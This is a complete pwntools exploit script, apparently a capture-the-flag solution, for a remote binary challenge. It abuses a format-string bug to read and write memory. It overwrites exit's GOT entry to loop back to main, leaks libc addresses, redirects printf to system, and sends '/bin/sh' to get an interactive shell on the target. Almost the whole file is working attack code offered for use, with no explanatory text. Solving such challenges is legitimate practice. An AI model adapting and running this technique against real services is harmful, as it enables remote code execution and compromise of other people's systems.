#!/usr/bin/python3
from pwn import *

r = True

context.arch = "amd64"
chalELF = ELF("./dump.bin")

if r:
    p = remote("challs.xmas.htsp.ro", 14712)
else:
    p = process("./dump.bin")
    gdb.attach(p, """
    
    """)

def do_read(addr):
    p.sendline("GumaTurbo123!")
    p.recvuntil("Check out port 14712\n")
    p.sendline(b"%7$sBBBB" + p64(addr))
    return p.recvuntil("BBBB")[:-4]

def do_write(addr, value):
    p.sendline("GumaTurbo123!")
    p.recvuntil("Check out port 14712\n")
    fmt1 = fmtstr_payload(6, {addr:value}, numbwritten=0)
    p.sendline(fmt1)

"""

p.sendline("GumaTurbo123!")
p.recvuntil("Check out port 14712\n")

# input at off 6

writes = {
    chalELF.got['exit'] : 0x401176, # main
}

fmt1 = fmtstr_payload(6, writes, numbwritten=0)
p.sendline(fmt1)
"""


do_write(chalELF.got['exit'], 0x401176) # main

setvbuf_leak = u64(do_read(chalELF.got['setvbuf']).ljust(8, b'\x00'))
puts_leak = u64(do_read(chalELF.got['puts']).ljust(8, b'\x00'))
printf_leak = u64(do_read(chalELF.got['printf']).ljust(8, b'\x00'))

log.info(f"setvbuf @ libc: 0x{setvbuf_leak:02x}")
log.info(f"puts @ libc: 0x{puts_leak:02x}")
log.info(f"printf @ libc: 0x{printf_leak:02x}")


libc_base = printf_leak - 0x64f70

do_write(chalELF.got['printf'], libc_base + 0x4f550) # system


p.sendline("GumaTurbo123!")
p.recvuntil("Check out port 14712\n")

p.sendline("/bin/sh\x00")
#leak = p.recvline()
#print(hexdump(leak))

p.interactive()